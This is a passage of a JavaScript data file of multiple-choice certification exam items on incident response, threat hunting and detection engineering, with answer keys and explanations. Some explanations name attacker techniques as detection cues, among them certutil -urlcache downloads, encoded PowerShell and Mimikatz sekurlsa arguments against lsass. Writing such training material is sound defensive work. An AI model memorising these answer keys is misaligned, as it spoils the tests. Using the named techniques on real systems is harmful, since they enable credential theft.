        explanation: "Multiple artifacts independently prove execution: Prefetch (run count/timestamps), Shimcache, Amcache (SHA1 hash), and UserAssist (GUI programs)."
      },
      {
        id: "ir-q7-25",
        question: "What is the biggest risk of not conducting lessons learned after an incident?",
        options: [
          "Repeating the same operational mistakes, leaving detection gaps unaddressed, and failing to improve response plans.",
          "Losing professional industry certifications for the incident handlers and receiving fines from compliance auditors.",
          "Decreased computer system processing speeds and database synchronization delays due to unoptimized security logging.",
          "Having the threat actor launch another attack using completely different tools and techniques that cannot be detected."
        ],
        correctAnswer: 0,
        explanation: "Without lessons learned, organizations repeat failures — the same attack vectors succeed again, detection gaps persist, and response doesn't improve."
      },
      {
        id: "ir-q7-26",
        question: "During a supply chain compromise, what makes containment uniquely challenging?",
        options: [
          "These attacks are extremely rare and only affect a single, isolated development server with no domain connection.",
          "The malicious code is encrypted using advanced RSA algorithms that cannot be decrypted without the private keys.",
          "You can simply block the vendor's IP address and terminate their credentials without affecting business operations.",
          "The malicious code is embedded within trusted, legitimately signed software updates, blending with normal operations."
        ],
        correctAnswer: 3,
        explanation: "Supply chain compromises embed in trusted software with valid signatures, making detection and containment complex — blocking the vendor disrupts operations."
      },
      {
        id: "ir-q7-27",
        question: "What information MUST an incident report's executive summary contain?",
        options: [
          "Every raw cryptographic hash value and network indicator of compromise discovered during the host-based analysis.",
          "The names and credentials of all incident handling staff members who participated in the technical investigation.",
          "High-level business impact, affected scope, timeline summary, and key remediations in non-technical language.",
          "A detailed manual step-by-step description of the forensic imaging software and registry parsing tools utilized."
        ],
        correctAnswer: 2,
        explanation: "Executive summaries communicate business impact, affected scope, high-level timeline, and actionable recommendations for leadership decision-making."
      },
      {
        id: "ir-q7-28",
        question: "How do you determine if an incident is a data breach requiring notification?",
        options: [
          "Every security incident is classified as a data breach, requiring immediate public statements and notification.",
          "Assess if regulated data (PII, PHI, financial) was accessed or exfiltrated, per applicable state and federal laws.",
          "Only if the stolen data has been confirmed as sold on dark web forums or leaked publicly on hacker repositories.",
          "Ask the threat actor directly via email if they successfully accessed or copied sensitive database records."
        ],
        correctAnswer: 1,
        explanation: "A breach requiring notification depends on data type (PII/PHI), access vs exfiltration evidence, and applicable regulations (GDPR, HIPAA, state laws)."
      },
      {
        id: "ir-q7-29",
        question: "What is the purpose of creating an incident timeline?",
        options: [
          "To reconstruct the sequence of events, understand the attack progression, and identify gaps in security detection.",
          "To justify the number of analyst hours billed to the corporate client and track employee shift schedules.",
          "To satisfy external compliance auditors during annual reviews and prevent fine assessments for minor incidents.",
          "To fill out administrative paperwork required by the legal department before closing the investigation ticket."
        ],
        correctAnswer: 0,
        explanation: "Timelines reveal attack progression, dwell time, detection delays, and response effectiveness — essential for root cause analysis and improvement."
      },
      {
        id: "ir-q7-30",
        question: "An incident involves a compromised service account with access to 50+ systems. What containment strategy is appropriate?",
        options: [
          "Disable all fifty host systems immediately, shutting down the network to prevent any further lateral movement.",
          "Ignore the service account credentials, as these accounts are not critical to Domain Controller security operations.",
          "Rotate account credentials immediately, audit all systems accessed, and establish enhanced monitoring for that account.",
          "Simply reset the password without conducting any logs review or check for persistent backdoors on local hosts."
        ],
        correctAnswer: 2,
        explanation: "Rotate credentials immediately, audit all accessed systems for signs of compromise, and add monitoring — don't just reset password (attacker may have installed backdoors)."
      }
    ]
  },
  // THREAT HUNTING FUNDAMENTALS — FINAL CERTIFICATION EXAM
  {
    quizId: "th-q7",
    courseId: "threat-hunting",
    title: "Threat Hunting Certification Exam",
    description: "Comprehensive final exam covering all 6 modules. You must pass with 80% or higher to earn your Threat Hunting Fundamentals certificate.",
    passingScore: 80,
    timeLimit: 60,
    questions: [
      { id: "th-q7-1", question: "What fundamentally distinguishes threat hunting from traditional detection?", options: ["Threat hunting requires a significantly larger budget and utilizes more automated vendor tooling", "Hunting is proactive and hypothesis-driven, whereas traditional detection is reactive and alert-driven", "There is no functional difference in practice, as both processes rely on the exact same endpoint logs", "Traditional detection exclusively focuses on cloud systems, while hunting is limited to internal servers"], correctAnswer: 1, explanation: "Hunting proactively searches for threats without alerts, using hypotheses. Detection relies on pre-built rules to generate alerts reactively." },
      { id: "th-q7-2", question: "In the Hunting Maturity Model (HMM), what characterizes Level 3 (Innovative)?", options: ["The organization has no active threat hunting capability and relies entirely on external security vendors", "Hunters only utilize commercial threat intelligence feeds and run pre-packaged security vendor playbooks", "Security hunters develop custom data analysis techniques and automate repetitive operational hunt procedures", "The program focuses exclusively on compliance audit checklists rather than active network defense hunting"], correctAnswer: 2, explanation: "HMM Level 3 organizations develop original analytical methods, automate repetitive hunts, and contribute to community knowledge." },
      { id: "th-q7-3", question: "What is the Pyramid of Pain and why is it important for hunting?", options: ["A basic vulnerability scoring system used to rank the severity of newly discovered zero-day software exploits", "A compliance and regulatory framework defining key security controls for protecting sensitive database records", "A training methodology used to evaluate the technical skills and certification paths of junior SOC analysts", "Ranks indicator types by adversary cost to change, showing that hunting behavioral TTPs forces the highest cost"], correctAnswer: 3, explanation: "The Pyramid of Pain shows that hunting for TTPs (top) is far more impactful than IOC matching (bottom) — attackers easily change hashes/IPs but struggle to change tactics." },
      { id: "th-q7-4", question: "You hypothesize APT actors are using scheduled tasks for persistence. What data do you hunt?", options: ["Windows Event ID 4698 logging scheduled task creation events and schtasks.exe command-line process creation logs", "Boundary firewall connection logs tracking outbound network traffic to known malicious command and control IPs", "Domain controller DNS resolution logs recording lookup requests for anomalous external domain names from hosts", "Email gateway server logs tracking inbound messages containing suspicious attachment patterns or macro scripts"], correctAnswer: 0, explanation: "Event ID 4698 logs scheduled task creation details. Also hunt for schtasks.exe in process creation logs with suspicious command-line arguments." },
      { id: "th-q7-5", question: "What is a LOLBin and why are they challenging to detect?", options: ["A family of specialized fileless malware designed to bypass standard signature-based antivirus applications", "Legitimate operating system binaries abused for malicious tasks, blending in with normal administrative activity", "A critical software vulnerability affecting older legacy systems that cannot be patched by administrators", "An encrypted network communication protocol used by attackers to establish secure command and control sessions"], correctAnswer: 1, explanation: "Living-off-the-Land Binaries (LOLBins) like powershell, certutil, mshta are legitimate tools abused by attackers — hard to detect because they're expected on systems." },
      { id: "th-q7-6", question: "How do you build a hunt hypothesis from MITRE ATT&CK?", options: ["Randomly selecting a list of adversary techniques from the matrix and executing generic search queries on endpoints", "Attempting to hunt for every single technique in the framework simultaneously using automated vendor templates", "Selecting a technique relevant to your threat model, identifying data sources, and defining anomalous behaviors", "Focusing exclusively on the most popular techniques reported by security media articles and compliance audits"], correctAnswer: 2, explanation: "Map your threat model to ATT&CK techniques, identify relevant data sources (process, network, file), and define baseline vs anomalous behavior." },
      { id: "th-q7-7", question: "What is the 'noise reduction' technique in threat hunting?", options: ["Disabling low-priority security alerts on SIEM consoles to prevent analysts from experiencing alert fatigue", "Reducing the overall volume of log collection by disabling process auditing on critical internal servers", "Ignoring false positive detections generated by legacy security tools during routine software deployment cycles", "Filtering out known-good baseline activities to isolate and surface anomalous behaviors for deep investigation"], correctAnswer: 3, explanation: "Stack known-good patterns (legitimate processes, normal users, expected schedules) and filter them out to surface anomalous behavior for investigation." },
      { id: "th-q7-8", question: "You discover that certutil.exe downloaded a file from an external URL. Is this malicious?", options: ["Highly suspicious — certutil is a LOLBin commonly abused for file downloads; investigate the context and URL", "Always malicious — legitimate administrative operations never utilize certutil.exe for utility execution tasks", "Always legitimate — certutil.exe is an essential operating system utility that regularly retrieves user updates", "Only suspicious if the execution is initiated by an administrative account rather than standard system users"], correctAnswer: 0, explanation: "certutil -urlcache -f is a known LOLBin technique (T1105). Investigate who ran it, what URL, what was downloaded, and the broader context." },
      { id: "th-q7-9", question: "What statistical technique helps identify C2 beaconing in network data?", options: ["Simple counting of connection volumes to identify the absolute busiest destination IP addresses on segment", "Analyzing inter-connection time intervals for low jitter to identify automated, regular contact periodicity", "Checking packet sizes and protocol header flags to confirm the presence of encrypted payload structures", "Looking at destination port numbers to identify sessions initiated on non-standard administrative ports"], correctAnswer: 1, explanation: "C2 beacons have regular timing intervals. Calculate the standard deviation of connection intervals — low jitter indicates automated beaconing." },
      { id: "th-q7-10", question: "How does threat intelligence enhance hunt hypotheses?", options: ["It completely replaces the need for hypotheses by telling analysts exactly where active threats are running", "It only adds public indicator hashes and IP address blocklists to the perimeter firewall configuration rules", "Provides detailed adversary TTPs, known behaviors, and campaign context to focus hunts on relevant threats", "It is not useful for threat hunting, as intelligence feeds are primarily designed for reactive alert sorting"], correctAnswer: 2, explanation: "TI provides context on active threat actors targeting your sector, their preferred TTPs, and specific IOCs to prioritize and focus hunt activities." },
      { id: "th-q7-11", question: "What is 'stacking' in hunt analysis?", options: ["Combining multiple vendor security tools together to process a single unified event stream on local servers", "Layering multiple exclusion filters in the SIEM console to reduce the number of active alerts for analysts", "Building a complex technology architecture containing several nested database layers and log storage pools", "Aggregating values and sorting by frequency to isolate rare outliers, also known as least-frequency analysis"], correctAnswer: 3, explanation: "Stacking groups values (process names, parent-child relationships, DNS queries) by frequency — rare items (bottom of the stack) deserve investigation." },
      { id: "th-q7-12", question: "You're hunting for credential dumping. Which data sources are MOST relevant?", options: ["Process access to lsass.exe (Sysmon Event 10), NTDS.dit file access, and suspicious SAM registry hive queries", "Web proxy access logs tracking HTTP/HTTPS connections and external file uploads to public storage sites", "Physical badge reader logs tracking employee entries and exits from secure data center server facilities", "Email gateway logs showing inbound phishing messages and attachments targeting human resources departments"], correctAnswer: 0, explanation: "Credential dumping targets lsass.exe memory (Mimikatz), NTDS.dit (domain), and SAM registry hives. Sysmon Event 10 logs process access to these." },
      { id: "th-q7-13", question: "What makes a good hunt hypothesis?", options: ["Being as broad and generalized as possible to capture any potential anomalous activity across the enterprise", "Being specific, testable, aligned with actor TTPs, and supportable by the data sources currently collected", "Relying primarily on analyst intuition and gut feelings without referencing threat models or structured data", "Focusing exclusively on blocking known indicators of compromise like static IP addresses and file hashes"], correctAnswer: 1, explanation: "Good hypotheses are specific (one technique), testable (data sources exist), threat-informed (relevant to your environment), and falsifiable." },
      { id: "th-q7-14", question: "How do you hunt for DLL sideloading?", options: ["Scanning all local system directories for known malware file signatures and reporting any matches to SOC", "Monitoring inbound and outbound network connections for anomalous protocol usage or unexpected port mapping", "Hunting for signed executables loading DLLs from user-writable paths or unsigned DLLs in system directories", "Reviewing active system administrator accounts and verifying their specific folder access rights on servers"], correctAnswer: 2, explanation: "DLL sideloading abuses DLL search order — hunt for signed EXEs loading unsigned DLLs, or DLLs loading from non-standard directories." },
      { id: "th-q7-15", question: "What is the difference between IOC-based and TTP-based hunting?", options: ["They are completely identical concepts and can be used interchangeably in hunt planning documentation", "TTP-based hunting is significantly easier to execute and automate than searching for static indicators", "IOC-based hunting is more effective at identifying novel, undocumented adversary campaigns and techniques", "IOC hunting matches static indicators like hashes, while TTP hunting seeks behavioral patterns of activity"], correctAnswer: 3, explanation: "IOC hunting is narrow and easily evaded (change hash = evade). TTP hunting finds behavioral patterns that persist across campaigns regardless of specific IOCs." },
      { id: "th-q7-16", question: "You find PowerShell executing encoded commands (-enc) at 3 AM from a service account. What is your assessment?", options: ["Highly suspicious — immediately decode the command and investigate the service account activity context", "Normal automated maintenance behavior commonly observed during scheduled updates across internal networks", "Ignore the event, as service accounts are typically trusted to run administrative tasks without auditing", "Propose blocking all PowerShell executions across the entire organization to prevent further operations"], correctAnswer: 0, explanation: "Encoded PowerShell from a service account at unusual hours is a strong indicator. Decode the command, investigate the account, and check for lateral movement." },
      { id: "th-q7-17", question: "What is the purpose of documenting hunt findings even when no threats are found?", options: ["It is a waste of analyst time and resources if no active threats or security exposures are discovered", "Validates security posture, highlights visibility gaps, refines baselines, and guides future hypotheses", "Only positive findings should be logged, as negative results do not demonstrate security program value", "It is strictly a regulatory compliance requirement for financial audits and serves no defensive purpose"], correctAnswer: 1, explanation: "Negative results are valuable — they prove you checked, identify logging gaps, improve baselines, and help prioritize future hunts." },
      { id: "th-q7-18", question: "How do you detect process injection techniques during a hunt?", options: ["Comparing file sizes of standard system binaries in System32 against known Microsoft baseline hashes", "Checking user authentication events to confirm that administrative sessions are not active at night", "Monitoring for processes accessing other processes' memory (Sysmon Event 8/10 or CreateRemoteThread calls)", "Analyzing external-facing firewall connection logs for high volumes of outbound web traffic to new IPs"], correctAnswer: 2, explanation: "Process injection involves writing to and executing in another process — Sysmon Event 8 (CreateRemoteThread) and Event 10 (ProcessAccess) capture these." },
      { id: "th-q7-19", question: "What is the value of hunting in cloud environments (AWS/Azure/GCP)?", options: ["Cloud environments are secure by default, so hunting is only needed for legacy on-premises applications", "It is not technically possible to perform active threat hunting in cloud infrastructure due to API limits", "Cloud hunting uses the exact same techniques, data sources, and correlation rules as on-premises hosts", "Rich cloud API logs like CloudTrail enable hunting for anomalous resource creation and access abuse"], correctAnswer: 3, explanation: "Cloud environments generate detailed API logs, enabling hunts for unusual API calls, privilege escalation, unauthorized access patterns, and misconfigurations." },
      { id: "th-q7-20", question: "What converts a successful hunt finding into an ongoing detection?", options: ["Translating the hunt query logic into a tuned SIEM correlation rule or Sigma signature for continuous alerts", "Nothing, as threat hunts are designed to be single, isolated exercises that do not affect active engineering", "Drafting a quick email to the security team outlining the indicators of compromise found during the hunt", "Writing a long PDF report and submitting it to executive leadership for manual approval and archiving"], correctAnswer: 0, explanation: "Successful hunts should be operationalized — convert the search logic into SIGMA/SIEM rules, test against historical data, tune for false positives, and deploy." },
      { id: "th-q7-21", question: "You're hunting in network metadata and find a host making HTTPS connections to an IP with a self-signed certificate every 30 minutes. Assessment?", options: ["Standard network HTTPS communication that can be ignored since the traffic payload is fully encrypted", "Potential C2 beaconing — self-signed certificate, regular intervals, and direct IP connection are key signs", "A minor certificate misconfiguration on a legitimate vendor website that does not present security risk", "Standard content delivery network behavior designed to optimize asset loading speeds for local clients"], correctAnswer: 1, explanation: "Regular interval + self-signed cert + direct IP (no SNI/domain) is classic C2. Investigate the host, check process making connections, and analyze timing patterns." },
      { id: "th-q7-22", question: "What is 'threat-informed defense' and how does it relate to hunting?", options: ["Collecting all available threat data feeds and importing them into perimeter firewall blocklists weekly", "A specific proprietary security product designed to automate all internal incident response procedures", "Focusing defense plans on real adversary behaviors, with hunts validating that those controls are working", "A regulatory compliance framework designed to audit corporate risk models and internal system baselines"], correctAnswer: 2, explanation: "Threat-informed defense uses real adversary intelligence to prioritize security. Hunts validate that defenses actually detect the prioritized TTPs." },
      { id: "th-q7-23", question: "How do you hunt for data exfiltration via cloud storage services?", options: ["Proposing to block all cloud storage services entirely across the organization to prevent outbound access", "Checking email attachment metadata to identify if sensitive files were sent to external personal accounts", "Monitoring network traffic volume on non-standard ports to detect hidden encrypted tunnels from database", "Auditing cloud API logs for large outbound transfers and tracking unauthorized cloud synchronization tools"], correctAnswer: 3, explanation: "Hunt for unusual cloud storage API usage, large file uploads, cloud sync tools running from unexpected users/machines, and outbound data volume anomalies." },
      { id: "th-q7-24", question: "What is the role of automation in mature threat hunting programs?", options: ["Automating data gathering, baseline enrichment, and routine searches to free analysts for creative hunts", "Completely replacing human threat hunters with automated machine learning detection models and alerting", "Automation has no practical role, as hunting relies entirely on creative manual investigation of events", "Running simple alert classification playbooks to speed up the closure of low-priority security incidents"], correctAnswer: 0, explanation: "Automation handles repetitive tasks (data gathering, enrichment, scheduled hunts) while humans focus on creative hypothesis development and complex analysis." },
      { id: "th-q7-25", question: "You discover WMI event subscriptions created on 5 servers at the same time. What does this indicate?", options: ["Routine administrative activity related to standard system monitoring agent deployments on the network", "Highly suspicious coordinated persistence mechanism deployed across systems — initiate incident response", "A transient WMI subsystem error that can be safely resolved by restarting the affected server services", "An expected operating system update configuration pushing new settings to internal server infrastructure"], correctAnswer: 1, explanation: "Simultaneous WMI event subscription creation across multiple servers suggests automated persistence deployment — a strong indicator of coordinated compromise." },
      { id: "th-q7-26", question: "What metrics should a hunt team track?", options: ["Only track the total number of critical threats and active malware infections discovered during a hunt", "The total hours spent on active investigation and number of security tools utilized in each campaign", "Hunts completed, unique findings discovered, new detections built, visibility gaps found, and ATT&CK mapping", "The total number of outgoing security status updates sent to team leads and administrative managers"], correctAnswer: 2, explanation: "Track hunt volume, finding rates, detection conversions, gaps discovered, ATT&CK coverage improvements — these demonstrate program value and guide priorities." },
      { id: "th-q7-27", question: "How does YARA complement threat hunting?", options: ["It completely replaces the need for proactive hunting by automating all system intrusion analysis tasks", "It acts as a primary email gateway scanner to intercept phishing messages containing malicious links", "It monitors network interface traffic for anomalous protocol usage and alerts on suspicious behaviors", "Enables pattern-based scanning of files and system memory for specific malware indicators during hunts"], correctAnswer: 3, explanation: "YARA rules define pattern-based signatures (strings, hex, conditions) to scan files, memory, and processes during endpoint hunts for known malware families." },
      { id: "th-q7-28", question: "What challenge does 'living off the cloud' present compared to traditional LOLBins?", options: ["Attackers abuse trusted SaaS platforms for C2, blending malicious traffic with legitimate business traffic", "It presents no actual challenge, as cloud-based network traffic is decrypted and inspected by firewalls", "It is significantly easier to detect because cloud service IPs are static and easily matched to feeds", "It only affects servers hosted in external public cloud instances and does not impact internal clients"], correctAnswer: 0, explanation: "Living off the cloud uses legitimate SaaS platforms for C2/exfiltration — traffic to these domains is expected, making detection extremely challenging." },
      { id: "th-q7-29", question: "When should hunt results be shared with the broader security team?", options: ["Only during periodic annual security audits to prevent internal exposure of critical detection gaps", "Immediately for active security threats, and regularly to share new baselines and detection logic rules", "Exclusively when directly requested by engineering managers or external compliance audit inspectors", "Never, as hunt findings are highly sensitive and should remain restricted to the threat hunt analysts"], correctAnswer: 1, explanation: "Share active threats immediately for response. Regular sharing of findings, baselines, and detection recommendations improves the entire security program." },
      { id: "th-q7-30", question: "What is the ideal relationship between threat hunting and detection engineering?", options: ["They are separate and isolated departments that do not share any data sources, tools, or event logs", "They form a linear process where threat hunts are performed first and then permanently retired from use", "A continuous loop where hunts feed detections, and engineering gaps inform the next threat hunting cycle", "Threat hunting completely replaces detection engineering by automating all alert analysis processes"], correctAnswer: 2, explanation: "Hunting and detection engineering form a virtuous cycle — hunt findings become new detections, and detection blind spots generate new hunt hypotheses." }
    ]
  },
  // DETECTION ENGINEERING BASICS — FINAL CERTIFICATION EXAM
  {
    quizId: "de-q7",
    courseId: "detection-engineering",
    title: "Detection Engineering Certification Exam",
    description: "Comprehensive final exam covering all 6 modules. You must pass with 80% or higher to earn your Detection Engineering Basics certificate.",
    passingScore: 80,
    timeLimit: 60,
    questions: [
      { id: "de-q7-1", question: "What is the primary goal of detection engineering?", options: ["Deploying perimeter security controls to block all external connection attempts immediately", "Creating high-fidelity, maintainable rules that reliably identify threats with low false positives", "Replacing manual security operations center analysts with fully automated machine learning tools", "Automating all corporate infrastructure changes to bypass traditional software engineering steps"], correctAnswer: 1, explanation: "Detection engineering creates quality rules that analysts trust — balancing detection coverage with actionable, low-noise alerts." },
      { id: "de-q7-2", question: "What is a SIGMA rule?", options: ["A hardware-specific network access rule applied to perimeter firewall systems on segments", "An encrypted mathematical hashing signature used to verify file integrity on database pools", "A vendor-neutral rule format in YAML that translates to multiple SIEM backend search queries", "A custom proprietary protocol used for routing system events from hosts to collectors"], correctAnswer: 2, explanation: "SIGMA rules are written in YAML and define detections that can be automatically converted to Splunk SPL, Elastic KQL, Microsoft KQL, and more." },
      { id: "de-q7-3", question: "In a SIGMA rule, what does the 'logsource' section define?", options: ["The specific software vendor and API token keys used to authenticate data streams in SIEM", "The output format layout, notification destination channels, and alert priority variables", "The execution timeframe limits and query memory boundaries allowed for matching rules", "The log category, source product, and specific service required to generate target events"], correctAnswer: 3, explanation: "logsource specifies where events come from (e.g., category: process_creation, product: windows) enabling correct backend conversion." },
      { id: "de-q7-4", question: "What SIGMA detection modifier matches any item in a list?", options: ["The default logical OR behavior applied automatically when listing multiple distinct values", "The 'all' modifier instructions forcing the engine to require every single value matches", "The 'contains' modifier parsing fields to evaluate substring patterns in telemetry lines", "The regular expression (regex) configuration enabling complex character matching syntax"], correctAnswer: 0, explanation: "By default, multiple values under a field use OR logic — any match triggers. Use 'all' modifier to require every value matches." },
      { id: "de-q7-5", question: "What is YARA primarily used for?", options: ["Real-time network traffic capture and protocol decoding across internal switch boundaries", "Pattern-based file and memory scanning to identify and classify specific malware families", "Automated parsing and normalization of system security logs ingested into central databases", "Multi-factor authentication management and user access credential validation on servers"], correctAnswer: 1, explanation: "YARA defines rules with string patterns, hex sequences, and conditions to identify malware families in files, memory dumps, and process memory." },
      { id: "de-q7-6", question: "In a YARA rule, what does the 'condition' section do?", options: ["Specifies a catalog list of target filenames and directory paths to scan on local disks", "Sets rules for priority levels, alerts severity rankings, and assigned analyst playbooks", "Defines the boolean logic determining when a match is triggered based on strings and meta", "Restricts signature scanning executions to specific target operating system types and versions"], correctAnswer: 2, explanation: "The condition section combines string identifiers, counts, file size checks, and boolean logic to determine if a file matches the rule." },
      { id: "de-q7-7", question: "What is the difference between Sysmon Event ID 1 and Windows Event ID 4688?", options: ["They are functionally identical event telemetry outputs recording identical information logs", "Event ID 4688 provides significantly more detailed hashes and parent command parameters", "Sysmon Event ID 1 is designed exclusively to monitor network traffic port usage on hosts", "Sysmon 1 adds process hashes, parent command lines, and directories; 4688 is native but sparse"], correctAnswer: 3, explanation: "Sysmon Event 1 captures file hash, parent process command line, current directory, and more. 4688 is native but requires audit policy and provides less detail." },
      { id: "de-q7-8", question: "What log source would detect credential dumping from LSASS?", options: ["Sysmon Event ID 10 (ProcessAccess) logging process handle requests targeting lsass.exe memory", "Boundary firewall connection logs tracking outbound TCP sessions initiated on admin ports", "Domain controller DNS query logs tracking lookup requests for anomalous external hostnames", "Web proxy access logs recording HTTP uploads of sensitive database files to public sites"], correctAnswer: 0, explanation: "Sysmon Event 10 logs when a process accesses another's memory — detecting tools like Mimikatz accessing lsass.exe for credential extraction." },
      { id: "de-q7-9", question: "What is 'Detection as Code'?", options: ["Writing all enterprise detection queries and correlation rules exclusively in Python scripts", "Managing rules via version control, unit testing, CI/CD deployment, and peer reviews", "Deploying artificial intelligence algorithms to automatically configure SIEM rules on system", "Manually coding custom event parsing engines from scratch to replace commercial SIEM tools"], correctAnswer: 1, explanation: "Detection as Code applies DevOps practices to detection management — Git versioning, automated testing, CI/CD deployment, and code review for quality." },
      { id: "de-q7-10", question: "Why is unit testing important for detection rules?", options: ["It has no practical defensive value and is performed solely to meet audit checklists", "It significantly speeds up rule deployment pipelines by bypassing manual approval cycles", "Verifies queries detect threat behaviors (TPs) while remaining silent on benign baseline (TNs)", "Automatically schedules regular hardware resource checks on central SIEM database engines"], correctAnswer: 2, explanation: "Unit tests verify detection logic against known-good and known-bad samples — catching false positives/negatives before rules impact production SOC." },
      { id: "de-q7-11", question: "What is the purpose of a detection coverage matrix mapped to MITRE ATT&CK?", options: ["Creating standard compliance reports to prove total network visibility to external auditors", "Tracking SOC analyst operational performance metrics like alert triage speeds and resolution", "Listing all active correlation rules configured on the central SIEM search console daily", "Visualizing detection visibility across technique layers to prioritize logic rule developments"], correctAnswer: 3, explanation: "Coverage matrices show detection presence/absence per ATT&CK technique, revealing gaps that detection engineers should prioritize filling." },
      { id: "de-q7-12", question: "How do you measure detection rule quality?", options: ["Evaluating true positive rates, false positive rates, detection latency, and actionability", "Counting the absolute number of active search rules configured inside production databases", "Measuring the length and logical complexity of the query syntax written by developers", "Tracking the number of distinct log sources ingested and normalized in the central SIEM"], correctAnswer: 0, explanation: "Quality metrics include TP/FP rates, detection latency, analyst satisfaction, and actionability — a high-TP, low-FP rule that analysts trust is high quality." },
      { id: "de-q7-13", question: "What is 'detection drift' and how do you prevent it?", options: ["A natural trend where detection rules automatically optimize their query execution speeds", "Rules losing accuracy as environments shift, prevented by continuous testing and validation", "Migrating active correlation queries between different SIEM database software architectures", "A baseline condition where user behaviors slowly align with malicious process signatures"], correctAnswer: 1, explanation: "Detection drift occurs when environment changes (new tools, infrastructure) invalidate existing rules. Regular validation and automated testing prevent drift." },
      { id: "de-q7-14", question: "What is the 'base rate fallacy' in detection engineering?", options: ["A basic calculation error that occurs when evaluating standard SQL search queries in SIEM", "A technical methodology used to baseline server CPU utilization metrics during audit periods", "When a detector for a rare event yields mostly false alerts because actual attacks are rare", "A specific modifier syntax feature used to translate SIGMA rules to Splunk query parameters"], correctAnswer: 2, explanation: "Even a 99% accurate detector for a 1-in-million event will generate far more false positives than true positives — understanding this guides rule tuning." },
      { id: "de-q7-15", question: "How should you handle a detection rule with a 90% false positive rate?", options: ["Delete the rule immediately from the production repository to prevent further console noise", "Ignore the high volume of alerts and assign junior analysts to close them out manually daily", "Lower the alert severity ranking level to low and allow events to accumulate in the database", "Analyze trigger patterns, implement targeted allowlists, or refine the logical query scope"], correctAnswer: 3, explanation: "Analyze FP patterns to identify what's triggering falsely, add targeted exclusions, narrow the rule scope, or redesign the detection approach entirely." },
      { id: "de-q7-16", question: "What is a SIGMA 'pipeline' in the context of rule conversion?", options: ["A mapping configuration translating generic SIGMA fields to match vendor-specific SIEM schema", "An automated database backup pipeline archiving cold historical log events to cloud storage", "A software CI/CD pipeline executing query syntax validation checks for git repositories", "A network log collection route forwarding endpoint telemetry data to central index servers"], correctAnswer: 0, explanation: "SIGMA pipelines define field name mappings and log source translations for specific SIEM backends — ensuring rules convert correctly to target query languages." },
      { id: "de-q7-17", question: "When writing a detection for PowerShell abuse, what makes '-enc' or '-encodedcommand' detection insufficient?", options: ["These parameters represent perfect detection points that cannot be evaded by threat actors", "PowerShell allows parameter abbreviation, enabling evasion via partial flags like -e or -en", "This query pattern generates excessive noise by matching standard system update scripts", "PowerShell does not natively support base64 encoded command execution on modern endpoints"], correctAnswer: 1, explanation: "PowerShell accepts abbreviated parameters — detect all variations: -e, -en, -enc, -enco, -encod, etc., or use regex for robust matching." },
      { id: "de-q7-18", question: "What is the difference between a 'detection' and an 'analytic'?", options: ["They are completely identical concepts in security engineering and are used interchangeably", "Analytics represent manual forensic queries, while detections are fully automated rules", "A detection triggers alert files, whereas an analytic provides patterns for threat hunting", "Analytics completely replace the necessity for configuring alerts inside modern SOC consoles"], correctAnswer: 2, explanation: "Detections are alert-generating rules. Analytics are broader queries that surface patterns, trends, or anomalies — analytics may feed into detection development." },
      { id: "de-q7-19", question: "How do you detect 'parent-child process anomalies'?", options: ["Comparing file sizes of running executable binaries against known verified Microsoft baselines", "Monitoring CPU resource spikes and memory allocation rates for individual user applications", "Analyzing external firewall connection histories to identify new destination IP addresses", "Mapping normal parent-child behaviors and alerting on outliers like Excel spawning cmd.exe"], correctAnswer: 3, explanation: "Baseline normal parent-child trees (explorer→chrome, services→svchost) and detect anomalies like winword.exe→powershell.exe or outlook.exe→cmd.exe." },
      { id: "de-q7-20", question: "What role does threat intelligence play in detection engineering prioritization?", options: ["Identifies actor TTPs targeting your sector, focusing rule development on active threats", "It has no role, as detection development focuses solely on internal system baselines", "It only serves to feed static file hashes and IP address blocklists to firewalls weekly", "It completely replaces the need for custom rules by automating all alert analysis steps"], correctAnswer: 0, explanation: "TI informs which threat actors target your sector and their preferred techniques — enabling prioritized detection development for the most relevant threats." },
      { id: "de-q7-21", question: "What is a 'canary token' and how does it relate to detection?", options: ["A software monitoring agent installed on endpoints to track active user application actions", "A decoy asset (fake files, credentials) generating high-fidelity alerts when accessed", "A specialized search utility used to optimize correlation queries on SIEM databases", "A template style used to standardize SIGMA rule configurations across git repositories"], correctAnswer: 1, explanation: "Canary tokens are decoy resources (fake admin creds, honeypot files, DNS canaries) that generate high-confidence alerts when touched — zero false positive detection." },
      { id: "de-q7-22", question: "What YARA feature enables hunting for packed or encrypted malware?", options: ["Basic plain-text string matching searches targeting standard program execution pathways", "Complex rule inheritance schemas designed to link multiple signatures together on systems", "The math module, using entropy calculations to detect packed or encrypted binary sections", "Hexadecimal string searches mapping specific variable byte patterns inside document files"], correctAnswer: 2, explanation: "The math module's entropy function identifies high-entropy sections (packed/encrypted data), combined with file size conditions to find suspicious binaries." },
      { id: "de-q7-23", question: "How should you handle detection rule versioning?", options: ["Maintain no versioning records, updating rule queries directly on the production console", "Using manual spreadsheet tracking logs to record the deployment history of database rules", "Configuring automated email updates to trigger alert notifications whenever rules are edited", "Using Git with semantic versioning, tagged releases, and changelogs tracking rule updates"], correctAnswer: 3, explanation: "Git versioning with semantic versioning (major.minor.patch), detailed changelogs, and tagged releases enables rollback, audit trail, and collaboration." },
      { id: "de-q7-24", question: "What is the 'alert funnel' concept in detection engineering?", options: ["Progressively filtering events through correlation and scoring to surface high-value alerts", "A proprietary database management utility used to speed up log indexing times in the SIEM", "A visualization dashboard displaying general monthly statistics of total generated alerts", "A software licensing metric calculating cost rates based on the volume of parsed log inputs"], correctAnswer: 0, explanation: "The alert funnel reduces noise through layers: raw events → correlated alerts → enriched alerts → scored/prioritized alerts for analyst review." },
      { id: "de-q7-25", question: "How do you write a SIGMA rule to detect Mimikatz execution?", options: ["Matching the static file name 'mimikatz.exe' on local workstation filesystem scan logs", "Detecting behavioral signals: lsass.exe access, known command flags, or memory injections", "Importing known MD5 and SHA256 hashes of Mimikatz releases directly into SIEM blocklists", "Monitoring active connection requests on network port 445 targeting domain controllers"], correctAnswer: 1, explanation: "Filename matching is trivially evaded. Detect behavior: lsass access patterns, known command-line arguments (sekurlsa, kerberos), or PE metadata indicators." },
      { id: "de-q7-26", question: "What is the purpose of detection rule deprecation?", options: ["Instantly deleting old rule entries from historical log databases to free search capacity", "Upgrading query formats automatically through external security community update scripts", "Formally retiring outdated or redundant rules with documented reasoning to avoid rule bloat", "Archiving rules in cold database storage solely to meet regulatory compliance checklists"], correctAnswer: 2, explanation: "Deprecation formally marks rules as retired with documented reasoning — preventing rule bloat while maintaining historical record for auditing." },
